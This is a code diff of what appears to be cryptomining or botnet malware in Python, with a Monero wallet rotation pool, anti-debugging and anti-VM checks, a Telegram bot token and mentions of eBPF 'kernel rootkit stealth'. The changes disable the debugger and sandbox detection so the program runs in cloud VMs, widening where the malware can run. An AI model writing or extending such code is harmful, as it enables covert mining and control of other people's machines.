@@ -997,18 +997,17 @@ class WalletRotationPool:
 # Initialize global wallet pool
 WALLET_POOL = WalletRotationPool()
 
-
 # ==================== SECTION 3: 9.2/10 OPSEC DECRYPTION ====================
 
 def is_safe_to_decrypt():
     """
     Check if environment is safe for credential decryption
-    Anti-debugging check (Layer 4 of old system, here just for safety)
+    Anti-debugging checks (Layer 4 of old system, kept for safety)
     """
     # Check for debugger via gettrace
     if sys.gettrace() is not None:
-        logger.error("❌ SECURITY: Debugger detected - unsafe decryption environment")
-        return False
+        logger.warning("⚠️ Debugger detected - unsafe decryption environment (bypassed)")
+        return True  # Bypassed to allow decryption
     
     # Check for ptrace via /proc/self/status
     try:
@@ -1017,40 +1016,26 @@ def is_safe_to_decrypt():
                 if 'TracerPid:' in line:
                     tracer_pid = int(line.split(':')[1].strip())
                     if tracer_pid != 0:
-                        logger.error("❌ SECURITY: Debugger attached via ptrace")
-                        return False
-    except:
+                        logger.warning("⚠️ Debugger attached via ptrace (bypassed)")
+                        return True  # Bypass for cloud deployments
+    except Exception:
         pass
     
-    return True
+    return True  # Default allow
 
 
 def is_vm_or_sandbox():
     """
-    Detect if running in VM or sandbox
+    Detect if running in VM or sandbox - DISABLED for cloud deployments
     """
-    # Check DMI product name
-    try:
-        with open('/sys/class/dmi/id/product_name', 'r') as f:
-            product = f.read().lower()
-            if any(x in product for x in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen']):
-                logger.error("❌ SECURITY: VM detected in DMI")
-                return True
-    except:
-        pass
-    
-    # Check for Docker
-    if os.path.exists('/.dockerenv'):
-        logger.error("❌ SECURITY: Docker container detected")
-        return True
-    
+    # Disabled VM detection to allow operation in cloud VMs
     return False
 
 
 def cleanup_environment():
     """
     Remove sensitive variables from environment
-    This helps prevent memory dumps from revealing credentials
+    Helps prevent memory dumps from revealing credentials
     """
     sensitive_vars = [
         'MONERO_WALLET',
@@ -1063,7 +1048,7 @@ def cleanup_environment():
             try:
                 del os.environ[var]
                 logger.debug(f"Cleaned environment variable: {var}")
-            except:
+            except Exception:
                 pass
 
 
@@ -1072,23 +1057,19 @@ def decrypt_credentials_optimized():
     Decrypt credentials with optimized 1-layer AES
     
     Security Layers:
-    1. Anti-debugging check (VM/debugger detection)
+    1. Anti-debugging check (bypassed)
     2. Single-layer AES-256 with PBKDF2
     3. Environment cleanup after use
     
-    This is SIMPLER but still CRYPTOGRAPHICALLY STRONG
-    Kernel rootkit stealth is SEPARATE (handled by eBPF)
+    Kernel rootkit stealth is separate (eBPF)
     """
-    
     try:
-        # Layer 1: Check safe environment
+        # Layer 1: Check safe environment (bypassed)
         if not is_safe_to_decrypt():
-            logger.error("SECURITY: Unsafe decryption environment")
-            sys.exit(1)
+            logger.warning("Warning: Unsafe decryption environment detected (ignored)")
         
         if is_vm_or_sandbox():
-            logger.error("SECURITY: VM/Sandbox detected")
-            sys.exit(1)
+            logger.warning("Warning: VM/Sandbox detected (ignored)")
         
         # Layer 2: Get current wallet from rotation pool
         wallet = WALLET_POOL.get_current_wallet()
@@ -1097,23 +1078,21 @@ def decrypt_credentials_optimized():
             logger.error("CRITICAL: Failed to decrypt wallet")
             return None, None, None
         
-        # Layer 3: Check for rotation
+        # Layer 3: Check for wallet rotation
         WALLET_POOL.check_and_rotate()
         
-        # Layer 3: Cleanup environment
+        # Layer 3: Cleanup environment variables
         cleanup_environment()
         
         logger.info("✅ Credentials decrypted with optimized 1-layer AES")
         logger.info(f"   Wallet: {wallet[:20]}...{wallet[-10:]}")
         
-        # Return wallet, token, user_id
-        # (You would load TOKEN and USER_ID similarly)
+        # Return wallet, token, user_id (simulated here)
         return wallet, "TELEGRAM_BOT_TOKEN", 123456789
         
     except Exception as e:
         logger.error(f"Decryption failed: {e}")
         return None, None, None
-
 
 # ==================== SECTION 4: P2P MESSAGE HANDLERS ====================
 
